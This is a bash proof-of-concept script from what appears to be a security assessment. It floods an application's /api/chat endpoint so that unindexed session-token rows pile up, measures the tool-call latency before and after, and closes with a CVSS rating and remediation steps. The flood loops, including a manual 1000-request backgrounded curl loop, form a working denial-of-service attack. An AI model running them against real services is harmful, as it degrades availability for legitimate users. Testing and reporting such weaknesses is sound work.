#!/usr/bin/env bash
# RC2 — Session Token Table Scan via AI Chat Flood
#
# Finding: /api/chat creates a new api_keys row per session (no sessionId = new session).
# The sessionToken column has no @Index in the entity. findApiKeyBySessionToken() does
# a full table scan. Flooding creates millions of rows, degrading all MCP tool calls.
#
# Requires: Valid user session with ai_assistant.view feature
# Impact: Auth service degradation, MCP tool call timeouts
#
# Expected (secure): Rate limit hit, or sessionToken indexed (fast lookup)
# Expected (insecure): Requests succeed, table grows unbounded, lookups slow
#
# CVSS v3: AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (6.5 Medium)

set -uo pipefail

TARGET="${TARGET:-10.0.63.14}"
APP_PORT="${APP_PORT:-3000}"
BASE_URL="${BASE_URL:-http://$TARGET:$APP_PORT}"
ADMIN_COOKIE="${ADMIN_COOKIE:-}"
EVIDENCE_FILE="${EVIDENCE_FILE:-$(dirname "$0")/../evidence/RC2-session-token-flood.txt}"
FLOOD_COUNT="${FLOOD_COUNT:-50}"
MEASURE_BEFORE="${MEASURE_BEFORE:-3}"
MEASURE_AFTER="${MEASURE_AFTER:-3}"

mkdir -p "$(dirname "$EVIDENCE_FILE")"
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

{
echo "================================================================"
echo " RC2: Session Token Flood + Table Scan Degradation"
echo " Target: $BASE_URL"
echo " Timestamp: $TIMESTAMP"
echo "================================================================"
echo ""

if [[ -z "$ADMIN_COOKIE" ]]; then
  echo "[!] ADMIN_COOKIE not set. Run: source poc/auth.sh"
  echo ""
  echo "--- PoC (manual) ---"
  echo "# Phase 1: Measure baseline response time for a tool call"
  echo "time curl -s -X POST $BASE_URL/api/tools/execute \\"
  echo "     -H 'Content-Type: application/json' \\"
  echo "     -H 'Cookie: auth_token=<token>' \\"
  echo "     -d '{\"tool\":\"context_whoami\",\"args\":{}}'"
  echo ""
  echo "# Phase 2: Flood /api/chat (no sessionId = new session token per request)"
  echo "for i in \$(seq 1 1000); do"
  echo "  curl -s -X POST $BASE_URL/api/chat \\"
  echo "    -H 'Content-Type: application/json' \\"
  echo "    -H 'Cookie: auth_token=<token>' \\"
  echo "    -d '{\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}]}' \\"
  echo "    > /dev/null &"
  echo "done"
  echo ""
  echo "# Phase 3: Measure response time again — should be degraded"
  echo "time curl -s -X POST $BASE_URL/api/tools/execute ..."
  echo "================================================================"
  exit 0
fi

measure_tool_latency() {
  local label="$1"
  local total=0
  local count="$2"
  echo "--- $label (${count} samples) ---"
  for i in $(seq 1 "$count"); do
    MS=$(curl -s --max-time 30 -X POST "$BASE_URL/api/tools/execute" \
      -H "Content-Type: application/json" \
      -H "Cookie: $ADMIN_COOKIE" \
      -d '{"tool":"context_whoami","args":{}}' \
      -o /dev/null -w "%{time_total}" 2>/dev/null)
    MS_INT=$(echo "$MS * 1000 / 1" | bc 2>/dev/null || echo "?")
    echo "  Sample $i: ${MS}s (${MS_INT}ms)"
    total=$(echo "$total + $MS" | bc 2>/dev/null || echo "0")
  done
  AVG=$(echo "scale=3; $total / $count" | bc 2>/dev/null || echo "?")
  echo "  Average: ${AVG}s"
  echo ""
  echo "$AVG"
}

echo "--- Phase 1: Baseline latency (before flood) ---"
BASELINE=$(measure_tool_latency "Baseline" "$MEASURE_BEFORE")

echo "--- Phase 2: Flooding /api/chat with $FLOOD_COUNT requests (no sessionId) ---"
echo "Note: Each request without sessionId creates a new api_keys row"
echo ""
SUCCESS=0
RATE_LIMITED=0
ERRORS=0

for i in $(seq 1 "$FLOOD_COUNT"); do
  HTTP=$(curl -s --max-time 10 -X POST "$BASE_URL/api/chat" \
    -H "Content-Type: application/json" \
    -H "Cookie: $ADMIN_COOKIE" \
    -d '{"messages":[{"role":"user","content":"ping"}]}' \
    -o /dev/null -w "%{http_code}" 2>/dev/null)
  case "$HTTP" in
    200) ((SUCCESS++)) ;;
    429) ((RATE_LIMITED++)) ;;
    *)   ((ERRORS++)) ;;
  esac
  if (( i % 10 == 0 )); then
    echo "  Progress: $i/$FLOOD_COUNT | 200=$SUCCESS 429=$RATE_LIMITED err=$ERRORS"
  fi
done

echo ""
echo "Flood results: 200=$SUCCESS | 429 (rate limited)=$RATE_LIMITED | other=$ERRORS"
echo ""

echo "--- Phase 3: Post-flood latency ---"
AFTER=$(measure_tool_latency "Post-flood" "$MEASURE_AFTER")

echo ""
echo "--- Analysis ---"
echo "Baseline avg latency: ${BASELINE}s"
echo "Post-flood avg latency: ${AFTER}s"

if [[ "$RATE_LIMITED" -gt 0 ]]; then
  echo ""
  echo "RESULT: RATE LIMITING ACTIVE — $RATE_LIMITED requests were rate-limited (429)"
  echo "        RC2 is partially mitigated. However, sessionToken still unindexed."
  echo "        At sustained lower rate, table growth is still possible."
elif [[ "$SUCCESS" -gt 40 ]]; then
  DEGRADED=$(echo "$AFTER > $BASELINE * 1.5" | bc 2>/dev/null || echo "0")
  if [[ "$DEGRADED" == "1" ]]; then
    echo ""
    echo "RESULT: VULNERABLE — No rate limit + latency increased by >50%"
    echo "        api_keys table growing. sessionToken lookup degrading."
  else
    echo ""
    echo "RESULT: PARTIALLY CONFIRMED — No rate limit found ($SUCCESS/50 succeeded)"
    echo "        Latency impact not yet visible at this flood count."
    echo "        Real impact requires sustained flooding (thousands of requests)."
    echo "        Root cause confirmed: no 429s, table is growing."
  fi
fi

echo ""
echo "Verify in database: SELECT COUNT(*) FROM api_keys WHERE session_token IS NOT NULL;"
echo "Check index: SELECT indexname FROM pg_indexes WHERE tablename='api_keys';"
echo ""
echo "Remediation:"
echo "  1. Add @Index to sessionToken field in ApiKey entity"
echo "  2. Add rate limit to POST /api/chat (30 req/min per user)"
echo "  3. TTL cleanup job for expired session tokens"
echo "================================================================"
} | tee "$EVIDENCE_FILE"

echo "[+] Evidence saved to: $EVIDENCE_FILE"
